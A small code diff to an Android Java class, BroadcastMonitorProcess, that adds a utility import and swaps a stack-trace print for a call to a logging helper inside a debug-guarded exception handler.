@@ -11,6 +11,7 @@ package com.android.service.listener;
 
 import com.android.service.RunningProcesses;
 import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 
 public class BroadcastMonitorProcess extends Thread {
 	/** The Constant TAG. */
@@ -40,7 +41,7 @@ public class BroadcastMonitorProcess extends Thread {
 			try {
 				wait(period);
 			} catch (InterruptedException e) {
-				if(Cfg.DEBUG) { e.printStackTrace(); }
+				if(Cfg.DEBUG) { Check.log(e); }
 			}
 		} while (true);
 	}
